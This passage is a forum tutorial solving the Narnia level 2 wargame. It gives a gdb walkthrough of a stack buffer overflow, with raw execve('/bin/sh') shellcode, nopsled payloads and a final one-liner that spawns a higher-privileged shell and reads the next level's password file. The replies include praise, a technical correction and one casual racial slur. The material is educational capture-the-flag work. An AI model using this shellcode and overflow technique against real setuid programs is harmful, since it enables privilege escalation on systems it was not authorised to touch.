<p>Ok, so we can clearly see our buffer of Aâ€™s. I went ahead and used <strong>gdb</strong>â€™s â€œxâ€ command which <strong>examines</strong> memory at a given register or address. The <strong>â€œ/50xâ€</strong> after the <strong>â€œxâ€</strong> tells <strong>gdb</strong> to print 50 WORDS (or 50 units of this architectureâ€™s default register size, in our case 32 bits = 4 bytes) in <strong>hex</strong>. Doing â€œx/50s $espâ€ would print 50 WORDS from $esp and list their values on the right as <strong>string</strong>. While way more readable, I recommend you get used to spotting hex values for your own benefit. The â€œ$esp-0xacâ€ is the address from which I want to examine 50 words. Unfortunately, at this point in our program, the stack has already popped off everything, so it is no longer pointing at 128 bytes + 4 bytes for int argc + 4bytes for char* argv<span class="chcklst-box fa fa-square-o fa-fw"></span> + 4 bytes for saved $ebp. It is now pointing way lower at either saved $ebp or $eip, so we need to look at a lower memory address (look higher up if you envision it as a graph that youâ€™re looking at and everything is writing downwards towards higher addresses). Examining the memory, we see that our buffer appears to start around 0xffffd5c0.<br>
Ok, so now lets imagine what input weâ€™re going to send to narnia2 and what its buffer is going to need to look like:</p>
<blockquote>
<p>i-------------------------------------------------------------------------------------|<br>
|-- shellcode --|-- garbage data print â€œAâ€ --|-- address of shellcode --|<br>
i-------------------------------------------------------------------------------------|</p>
</blockquote>
<p>We refer to the entire chunk of data we are sending as our payload. This is our payload, totallying 144 bytes. The last 4 bytes must be the address to the start of our shellcode (which is the start of the buffer), and shellcode + garbage data must be equal to 140 bytes. So garbage data = 140 - shellcode.</p>
<p>Let us get the length of our shellcode. We have our kÌ¶nÌ¶oÌ¶wÌ¶nÌ¶ Ì¶wÌ¶oÌ¶rÌ¶kÌ¶iÌ¶nÌ¶gÌ¶ (<strong>LOL</strong>) shellcode from narnia1 so we just need to find its length. Weâ€™re lazy though and wouldnâ€™t want to terminate our gdb sessionâ€¦ in order to execute bash commands within gdb, use <strong>!</strong> at the beginning of the line.</p>
<blockquote>
<p>(gdb) !python -c â€˜print len(â€œ\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43â€)â€™<br>
49<br>
(gdb) set args $(pythong -c â€˜print â€œ\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43â€ + â€œAâ€*91 + â€œ\xc0\xd5\xff\xffâ€â€™)<br>
(gdb) run</p>
</blockquote>
<blockquote>
<p>Starting program: /games/narnia/narnia2 $(pythong -c â€˜print â€œ\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43â€ + â€œAâ€*91 + â€œ\xc0\xd5\xff\xffâ€â€™)<br>
ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½^1ï¿½ï¿½F[Inferior 1 (process 25969) exited normally]</p>
</blockquote>
<p>Hmmmmâ€¦ peculiar. It seems to have run, but not popped a shellâ€¦ This should have worked. Memory is tricky sometimes, maybe it landed in the middle of this shellcode and since the whole thing didnâ€™t get ran it didnâ€™t workâ€¦ Letâ€™s try putting a nopsled at the front in case we mathâ€™d wrong. (Note: lots of my asterixs and shit just disappear so you canâ€™t quite just copy paste this and have to understand what is going on to do it on your ownâ€¦ any questions send me a message or yell at me in IRC)</p>
<blockquote>
<p>(gdb) set args $(python -c â€˜print â€œ\x90â€*51 + â€œ\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43â€ + "\xc8\xd5\xff\xff"11â€™)<br>
(gdb) run<br>
The program being debugged has been started already.<br>
Start it from the beginning? (y or n) y</p>
</blockquote>
<blockquote>
<p>Starting program: /bin/dash $(python -c â€˜print â€œ\x90â€*51 + â€œ\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43â€ + â€œ\xc0\xd5\xff\xffâ€*11â€™)<br>
Error in re-setting breakpoint 1: No symbol â€œmainâ€ in current context.<br>
Error in re-setting breakpoint 1: No symbol â€œmainâ€ in current context.<br>
Error in re-setting breakpoint 1: No symbol â€œmainâ€ in current context.<br>
Error in re-setting breakpoint 1: No symbol â€œmainâ€ in current context.<br>
/bin/dash: 0: Canâ€™t open ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½^1ï¿½ï¿½F<br>
[Inferior 1 (process 28745)</p>
</blockquote>
<p>Hmmmm, so I added a nopsled and it still didnâ€™t work. I added a nopsled and spammed my retrun address 11 times (bytes 100 to 144) to make sure that I wasnâ€™t mathâ€™ing that wrong eitherâ€¦ Check back here sometime for another installment of why shit works here and not there, where I figure this one out. But for now, lets just grab new shellcodeâ€¦</p>
<p>And fuck that whole process of looking everywhere for itâ€¦ letâ€™s just see what other people used in narnia tutorials around the web so I donâ€™t pull my hair out.<br>
Ok, the most used shellcode that works reliably in exploits is:</p>
<blockquote>
<p>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80</p>
</blockquote>
<p>So lets try that again, shall we?</p>
<blockquote>
<p>(gdb) !python -c â€˜print len(â€œ\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80â€)â€™<br>
25</p>
</blockquote>
<p>140 - 25 = 115 garbage bytes.</p>
<blockquote>
<p>(gdb) set args $(python -c 'print â€œ\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80â€ + â€œAâ€*115 â€œ\xc8\xd5\xff\xffâ€)<br>
(gdb) run<br>
Breakpoint 1, 0x080484c1 in main ()<br>
(gdb) c<br>
Continuing.<br>
process 27690 is executing new program: /bin/dash<br>
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the â€œfileâ€ command.<br>
Error in re-setting breakpoint 1: No symbol â€œmainâ€ in current context.<br>
Error in re-setting breakpoint 1: No symbol â€œmainâ€ in current context.<br>
Error in re-setting breakpoint 1: No symbol â€œmainâ€ in current context.<br>
$ ls<br>
narnia0    narnia1    narnia2     narnia3    narnia4    narnia5      narnia6    narnia7    narnia8<br>
narnia0.c  narnia1.c  narnia2.c  narnia3.c  narnia4.c  narnia5.c  narnia6.c  narnia7.c    narnia8.c<br>
$whoami<br>
narnia2<br>
$exit<br>
(gdb)</p>
</blockquote>
<p>At this point I had inserted a breakpoint earlier to see what was going on (I had previously too but didnâ€™t mention anything). Weâ€™ll go wayyyyy more in depth with <strong>gdb</strong> in the future to see just how powerful and useful it can be when debugging. But for now, this is all you need to know. Unfortuntely, our exploit breaks out of narnia2 binary, but gains privileges of the user running gdb, which is narnia2. So we have to do this <strong>outside of gdb</strong> for it to work correctly. Sometimes some things donâ€™t work correctly in <strong>gdb</strong>, as their are certain Op codes reserved for certain tasks in <strong>gdb</strong>â€¦ which is highly likely why that shellcode worked in narna1 and then not in narnia2. All thatâ€™s left to do is insert our payload into narnia2 and grab the password to narnia3. Science, Bitches.</p>
<blockquote>
<p>(gdb) quit<br>
narnia2@melinda:/games/narnia$ ./narnia2 $(python -c â€˜print â€œ\x90â€*75 + â€œ\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80â€ + â€œ\xc8\xd5\xff\xffâ€*11â€™)<br>
$<br>
$ whoami<br>
narnia3<br>
$ cd /etc/narnia_pass/<br>
$ ls<br>
narnia0  narnia2  narnia4  narnia6  narnia8<br>
narnia1  narnia3  narnia5  narnia7  narnia9<br>
$ cat narnia3</p>
</blockquote>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="3" />
              <span class='post-likes'>3 Likes</span>
            </div>


            
          </div>
          <div id='post_2' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/nopSled.html'><span itemprop='name'>nopSled</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-07-06T21:07:36Z' class='post-time'>
                    July 6, 2016,  9:07pm
                  </time>
                  <meta itemprop='dateModified' content='2016-07-06T21:07:36Z'>
              <span itemprop='position'>2</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>missed u famalam i see youâ€™re busy educating! hope to see you soon. very informative tut</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
          <div id='post_3' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/dtm.html'><span itemprop='name'>dtm</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-07-07T02:49:57Z' class='post-time'>
                    July 7, 2016,  2:49am
                  </time>
                  <meta itemprop='dateModified' content='2016-07-07T02:49:57Z'>
              <span itemprop='position'>3</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <aside class="quote no-group" data-username="123loaded" data-post="1" data-topic="704">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="24" height="24" src="../../user_avatar/d.clarkee.co.uk/123loaded/48/578_2.png" class="avatar"> 123loaded:</div>
<blockquote>
<p>makes sure the user is only trying to pass it one argument, else exit</p>
</blockquote>
</aside>
<p><code>argc</code> counts the number of command line arguments <em>including</em> the string of the executable (i.e. <code>arg[0]</code>). The program will exit itself if there are <em>no extra command line arguments</em>.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="3" />
              <span class='post-likes'>3 Likes</span>
            </div>


            
          </div>
          <div id='post_4' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Cromical.html'><span itemprop='name'>Cromical</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-07-07T02:50:37Z' class='post-time'>
                    July 7, 2016,  2:50am
                  </time>
                  <meta itemprop='dateModified' content='2016-07-07T02:50:37Z'>
              <span itemprop='position'>4</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Mate, love the series! I love how you describe everything so well. Good job! Iâ€™ll be looking forward to your other tuts!</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_5' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/123loaded.html'><span itemprop='name'>123loaded</span></a>
                (123loaded)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-07-07T08:31:14Z' class='post-time'>
                    July 7, 2016,  8:31am
                  </time>
                  <meta itemprop='dateModified' content='2016-07-07T08:31:14Z'>
              <span itemprop='position'>5</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>LoL, yeah youâ€™re absolutely correct. Tbh I didnâ€™t even really look at that piece of code. Glossed right over it and was just kind of commenting on what I thought it was doing lol. Thx for the in-depth analysis though! Glad some peeps are reading these! &lt;3</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
          <div id='post_6' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/123loaded.html'><span itemprop='name'>123loaded</span></a>
                (123loaded)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-07-07T08:31:45Z' class='post-time'>
                    July 7, 2016,  8:31am
                  </time>
                  <meta itemprop='dateModified' content='2016-07-07T08:31:45Z'>
              <span itemprop='position'>6</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>LoLoLoLoL, you too boo. Happy early bday my nigga. &lt;3</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
          <div id='post_7' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/0x00pf.html'><span itemprop='name'>0x00pf</span></a>
                (pico)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-07-07T16:18:53Z' class='post-time'>
                    July 7, 2016,  4:18pm
                  </time>
                  <meta itemprop='dateModified' content='2016-07-07T16:18:53Z'>
              <span itemprop='position'>7</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Good post!</p>
<aside class="quote no-group" data-username="123loaded" data-post="1" data-topic="704">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="24" height="24" src="../../user_avatar/d.clarkee.co.uk/123loaded/48/578_2.png" class="avatar"> 123loaded:</div>
<blockquote>
<p>Check back here sometime for another installment of why shit works here and not there, where I figure this one out.</p>
</blockquote>
</aside>
<p>I will keep it hidden so, in case you want to figure it out yourself I do not spoil it <img src="../../images/emoji/twitter/wink8e5e.png?v=15" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"></p>
<div class="spoiler">
<p>The first shellcode contains a couple of <code>\x0a</code>. This is a newline character. When passing that string as a command-line parameter the shellcode string  gets broken at that character and therefore you never overflow the buffer.</p>
</div>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_8' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/pry0cc.html'><span itemprop='name'>pry0cc</span></a>
                (Leader &amp; Offsec Engineer &amp; Forum Daddy)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-07-07T16:28:58Z' class='post-time'>
                    July 7, 2016,  4:28pm
                  </time>
                  <meta itemprop='dateModified' content='2016-07-07T16:28:58Z'>
              <span itemprop='position'>8</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>BRUH. This tutorial is so dope. I loved the addition of comedy, it made me smile all the way through reading this.</p>
<p>When I first saw the code I knew this was going to be a good tutorial. Good old stack buffer overflow. Nice job!</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_9' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/system.html'><span itemprop='name'>system</span></a>
                (system)
                  Closed 
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-01-21T00:43:59Z' class='post-time'>
                    January 21, 2018, 12:43am
                  </time>
                  <meta itemprop='dateModified' content='2018-01-21T00:43:59Z'>
              <span itemprop='position'>9</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
    </div>


    




    </div>
    <footer class="container wrap">
  <nav class='crawler-nav'>
    <ul>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../index.html' itemprop="url">Home </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../categories.html' itemprop="url">Categories </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../guidelines.html' itemprop="url">Guidelines </a>
        </span>
      </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../tos.html' itemprop="url">Terms of Service </a>
          </span>
        </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../privacy.html' itemprop="url">Privacy Policy </a>
          </span>
        </li>
    </ul>
  </nav>
  <p class='powered-by-link'>Powered by <a href="../../../external.html?link=https://www.discourse.org/">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>

    
    <script src="../../../external.html?link=http://instant.page/3.0.0" type="module" defer="" integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1" nonce="VK5v7N3P3Ni6EsU2IOrMhDUbA"></script>
  </body>
  
</html>
